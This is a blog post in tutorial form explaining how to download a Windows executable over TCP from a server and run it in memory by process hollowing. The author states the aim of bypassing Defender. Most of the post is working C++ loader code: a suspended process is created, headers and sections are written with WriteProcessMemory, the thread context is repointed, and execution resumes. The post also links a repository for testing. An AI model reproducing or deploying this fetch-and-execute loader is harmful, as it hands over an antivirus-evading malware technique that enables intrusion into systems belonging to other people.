---
title: Remote Run PE 
layout: post
---

## Intro

Hi , today I will tell you how we can execute PE in memory and how we can bypass defender by using this 

## What is PE ?

PE (Portable Executable) is an executable and object file format used in Windows family operating systems such as Windows NT, Windows 2000, Windows XP, Windows 7, Windows 10, and others.

PE files include executable files (usually with the .exe extension), dynamic libraries (DLLs), and other file types that can be run on the Windows platform. The PE format was introduced in Windows NT and replaced the older NE (New Executable) format used in earlier versions of the operating system.

In brief, a PE file is an executable file format such as .exe (executable programs) and .dll (dynamic libraries) used in Windows operating systems.

You can read more here https://0xrick.github.io/win-internals/pe2/

## How to run PE in memory ?

In order to run a PE file, first of all it must be received, in our case we will receive the file using tcp and store this buffer in memory.

In my example, when connecting to the server, it asks to get the file size to increase the buffer, then the client sends a start command to get the file. After the server sends the file, we save it to the buffer as vector<char>. 

```cpp
    printf("[+] Connecting!\n");

    //Initialize tcp client class 
    TCPClient tcpClient;

    //Receiving buffer
    std::vector<char> recvBuff;
    int iResult;

    //Value to check correct actions
    BOOL bConnResult;
    BOOL bSendResult;

    // Contecting to server
    bConnResult = tcpClient.connectToServer("192.168.222.128", 4443);;
    if (!bConnResult) {
        return CONNECTION_ERROR;
    }

    printf("[+] Connected!\n");
    printf("[+] Send command to get file size!\n");

    // Send to the server to get file size
    bSendResult = tcpClient.sendToServer("GetFileSize");
    if (!bSendResult) {
        return SENDING_ERROR;
    }

    // validation
    iResult = tcpClient.reciveData();
    if (iResult <= 0) {
        return RECIVE_DATE_ERROR;
    }

    // Getting received buffer 
    recvBuff = tcpClient.getBuffer();

    // vector<char> to string 
    std::string sFileLength(recvBuff.begin(), recvBuff.end());
    printf("[+] Received data: %s\n", sFileLength.c_str());

    // str to int 
    int iFileLength = std::stoi(sFileLength);

    // Change the buffer length for the received data  
    tcpClient.setBufLen(iFileLength);

    printf("[+] Send command to load PE!\n");

    //Send to the server for load PE in memory
    bSendResult = tcpClient.sendToServer("start");
    if (!bSendResult) {
        return SENDING_ERROR;
    }

    //We use delay to make sure the server sends the whole file.
    Sleep(1000 * 5);

    // Getting data
    iResult = tcpClient.reciveData();
    if (iResult <= 0 ) {
        return RECIVE_DATE_ERROR;
    }

    // save to our buffer 
    recvBuff = tcpClient.getBuffer();
    printf("[+] Received data: %.*s\n", iResult, recvBuff.data());
```

You can learn more about how my TCPClient class works, I have left comments, for more details you can write to me in Telegram. 

Once we have the file, we move on to the juice itself.

### Execute PE in Memory 

After getting the file, we need to check the correctness of our PE file.
How do we do this? It's simple, we need to get DOS Header and NT Header.

### What is DOS Header ?

DOS-header is a data structure located at the very beginning of a PE file and its first value is the signature sequence MZ (0x4D5A), which serves to identify the file format and determine whether the file is a PE or not

You can read more here https://0xrick.github.io/win-internals/pe3/


What the DOS structure looks like:
```cpp
    typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header
        WORD   e_magic;                     // Magic number
        WORD   e_cblp;                      // Bytes on last page of file
        WORD   e_cp;                        // Pages in file
        WORD   e_crlc;                      // Relocations
        WORD   e_cparhdr;                   // Size of header in paragraphs
        WORD   e_minalloc;                  // Minimum extra paragraphs needed
        WORD   e_maxalloc;                  // Maximum extra paragraphs needed
        WORD   e_ss;                        // Initial (relative) SS value
        WORD   e_sp;                        // Initial SP value
        WORD   e_csum;                      // Checksum
        WORD   e_ip;                        // Initial IP value
        WORD   e_cs;                        // Initial (relative) CS value
        WORD   e_lfarlc;                    // File address of relocation table
        WORD   e_ovno;                      // Overlay number
        WORD   e_res[4];                    // Reserved words
        WORD   e_oemid;                     // OEM identifier (for e_oeminfo)
        WORD   e_oeminfo;                   // OEM information; e_oemid specific
        WORD   e_res2[10];                  // Reserved words
        LONG   e_lfanew;                    // Offset to the NT header
    } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
```

What do we need it for? To get a signature value, to check if PE is correct. 
How do we test this? Like this. 

```cpp
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buff;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Incorrect dos header...\n");
        return false;
    }
```

Once we have the DOS Header , we can now get the NT Header 

### What is NT Header?

NT Header (or NT header) is the part of the PE structure responsible for describing the basic parameters of the executable file in the operating system.

You can read more here https://0xrick.github.io/win-internals/pe4/

This is how the structure looks like for 32 and 64 bit systems:
**32-bit Version:**
```
    typedef struct _IMAGE_NT_HEADERS {
    DWORD                   Signature;
    IMAGE_FILE_HEADER       FileHeader;
    IMAGE_OPTIONAL_HEADER32 OptionalHeader;
    } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

```

**64-bit Version:**
```
    typedef struct _IMAGE_NT_HEADERS64 {
        DWORD                   Signature;
        IMAGE_FILE_HEADER       FileHeader;
        IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;
```

This structure will also help us to determine the validity of the received PE file 
How can we do that? Here's the code 

```cpp
    PIMAGE_NT_HEADERS lpNtHdr = (PIMAGE_NT_HEADERS)(buff + dosHeader->e_lfanew);
    if (lpNtHdr->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Incorrect NT signature...\n");
        return false;
    }
```

## Running!

We will load the PE file into the memory of the new process and run it from there.


### Getting the main headers 
First we need to get the two main headers. 
NT and DOS, we have already seen how to check them, now let's get them.

```cpp
    // Getting the DOS header , 
    // to get it we need to refer to the base address of the PE file 
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)buff;

    // NT header is obtained as a consequence of the sum 
    // of the e_lfanew value from the DOS header and the base address. 
    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)(buff + pDosHdr->e_lfanew);
```

Once we have the basic headers, we will create a new process to run the PE file there. 

### Creating process

Let's now create a new instance of the current process.
```cpp
    // Is a structure used to store information about a new process created using the CreateProcess function.
    PROCESS_INFORMATION pi;

    // Used to set all bytes in the structure to 0
    // This can be useful to avoid random values in the structure
    ZeroMemory(&pi, sizeof(pi));

    // The structure is needed to fill in the information at the start of the process 
    STARTUPINFO si;

    // Used to set all bytes in the structure to 0
    // This can be useful to avoid random values in the structure
    ZeroMemory(&si, sizeof(si));

    // Wchar array, which will store the path to the current process with MAX_PATH length.
    WCHAR wszFilePath[MAX_PATH];

    // Is used to get the full path to the executable file of the current process
    if (!GetModuleFileName(NULL, wszFilePath, sizeof(wszFilePath))){
        DWORD error = GetLastError();
        printf("[!] GetModuleFileName end with error %lu\n", error);

        TerminateProcess(pi.hProcess, -2);
        return;
    }
    //  Creating a new instance of the current process 
    if (!CreateProcess(wszFilePath,NULL,NULL,NULL,TRUE,CREATE_SUSPENDED,NULL,NULL,&si,&pi)){
        DWORD error = GetLastError();
        printf("[!] CreateProcess end with error %lu\n", error);

        TerminateProcess(pi.hProcess, -3);
        return;
    }
```

Now we should get the context of the thread. 
We need this to prepare and start a new process that will execute the code from the PE file. 
Let's go through the main points of the code.

```cpp
    // Allocate memory for the context structure
    CONTEXT* ctx = LPCONTEXT(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE));

    // Set context flag to FULL 
    ctx->ContextFlags = CONTEXT_FULL;

    // Check if the context information for the thread was successfully obtained
    if (!GetThreadContext(pi.hThread, ctx)){
        DWORD error = GetLastError();
        printf("[!] GetThreadContext end with error %lu\n", error);

        TerminateProcess(pi.hProcess, -4);
        return;
    }
```

Set the CONTEXT_FULL flag in the ContextFlags field of the CONTEXT structure. 
This indicates that we need to get the complete thread execution context, including the values of all processor registers.

Call GetThreadContext to get the current execution context of the thread in the newly created process.

The general sense of all this is to get information about the state of the thread in the created process, in which further operations will take place to execute the PE file in memory.

### Storage location 

Now we need to allocate memory in the created process at the address ImageBase in OptionalHeader.
What is this for? We will write our PE file there.
Why there? To avoid conflicts with other modules.

How do we allocate memory there ?  
It's not a big deal :)

```cpp
    // Pointer to the image base
	LPVOID lpImageBase = VirtualAllocEx(
		pi.hProcess,
		(LPVOID)(pNtHdr->OptionalHeader.ImageBase),
		pNtHdr->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (lpImageBase == NULL) {
		DWORD error = GetLastError();
		printf("[!] VirtualAllocEx end with error %lu\n", error);
	
		TerminateProcess(pi.hProcess, -5);
		return;
	}
```

### Writing headers 

After we have allocated the memory for our PE file, we need to write our chants.
If you have read about PE structures, we immediately understood what this is for.
Writing our headers is just for corrective work.

Let's see how it works:
```cpp
    if (!WriteProcessMemory(pi.hProcess,lpImageBase,buff,pNtHdr->OptionalHeader.SizeOfHeaders,NULL)){
        DWORD error = GetLastError();
        printf("[!] WriteProcessMemory end with error %lu\n", error);

        TerminateProcess(pi.hProcess,-6);
        return;
    }
```
This is where we write to the process memory from the buff buffer to the memory area in the new process.

pi.hProcess - process descriptor of the process we are writing to.
lpImageBase - memory location where the PE file is loaded.
buff - buffer containing PE-file data.
pNtHdr->OptionalHeader.SizeOfHeaders - size of PE-file headers

Why is buff passed as write data? PE file headers are at the beginning of the file, 
and because we know the size of all our headers, we pass buff as write data.

### Writing all sections 

Also, for correct operation we should write all the actions of our PE to memory.
Let's see how to do it 

First we need to get the number of sections of our PE file.
This is stored in FileHeader.

This is how we get the number of sections
```cpp
    pNtHdr->FileHeader.NumberOfSections
```

We will write all our sections through the loop, and with the number of sections, this is easy. 
But where do we write them?
The PE file stores the virtual address of the section, to get it. 
we need to get the section structure itself.
```cpp
    pSectionHdr = PIMAGE_SECTION_HEADER(DWORD64(pNtHdr) + sizeof(IMAGE_NT_HEADERS) + iSection * sizeof(IMAGE_SECTION_HEADER));
```

Once we have the SECTION_HEADER , we just need to add the addresses , 
for the section location of our PE file
```cpp
    (LPVOID)((DWORD64)(lpImageBase) + pSectionHdr->VirtualAddress)
```

To get the data , SECTION_HEADER has an offest , from the base address to the section pointer
```cpp
    (LPVOID)((DWORD64)(buff) + pSectionHdr->PointerToRawData)
```

Here is the loop that will write our sections to our PE file 
```cpp
    	// Write all sections 
	for (SIZE_T iSection = 0; iSection < pNtHdr->FileHeader.NumberOfSections; ++iSection){
		
		// Pointer to section header 
		pSectionHdr = PIMAGE_SECTION_HEADER(DWORD64(pNtHdr) + sizeof(IMAGE_NT_HEADERS) + iSection * sizeof(IMAGE_SECTION_HEADER));
 		
		// Write Section
		// 'buff' buffer pointer
		// 'lpImageBase + pSectionHdr->VirtualAddress' virtual address in process memory where the data from the buffer will be copied.
		// 'pSectionHdr->PointerToRawData' offset from the beginning of the file to the beginning of the source data for a particular section.
		// This offset is used to calculate the address in the buffer from which the data for a given section should be taken.
		if (!WriteProcessMemory(
			pi.hProcess,
			(LPVOID)((DWORD64)(lpImageBase) + pSectionHdr->VirtualAddress),
			(LPVOID)((DWORD64)(buff) + pSectionHdr->PointerToRawData),
			pSectionHdr->SizeOfRawData,
			NULL
		)){
			DWORD error = GetLastError();
			printf("[!] WriteProcessMemory end with error %lu\n", error);
			
			TerminateProcess(pi.hProcess,-7);
			return;
		}

	}
```

### Set Entry Pointer 

Write our ImageBase address
```cpp
    if (!WriteProcessMemory(pi.hProcess,(LPVOID)(ctx->Rdx + sizeof(LPVOID) * 2),&lpImageBase,sizeof(LPVOID),NULL)){
        DWORD error = GetLastError();
        printf("[!] WriteProcessMemory end with error %lu\n", error);

        TerminateProcess(pi.hProcess,-8);
        return;
    }
```

And then specifies our entry point
```cpp
    ctx->Rcx = (DWORD64)(lpImageBase) + pNtHdr->OptionalHeader.AddressOfEntryPoint;
```

### EXECUTE!!!

Теперь просто стоит указать наш конекст и вернуть поток 
```cpp
    // Set the context
    if (!SetThreadContext(pi.hThread,ctx))
    {
        DWORD error = GetLastError();
        printf("[!] SetThreadContext end with error %lu\n", error);

        TerminateProcess(pi.hProcess,-9);
        return;
    }
    // ´Start the process
    if (!ResumeThread(pi.hThread))
    {
        DWORD error = GetLastError();
        printf("[!] ResumeThread end with error %lu\n", error);

        TerminateProcess(pi.hProcess,-10);
        return;
    }
```


## Resume 

Now I have told you in brief how Remote PE run in memory works. 
If you have any comments, you can write to me in Telegram. Here is a link to github for testing https://github.com/ymmfty0/RemoteFileExecute/.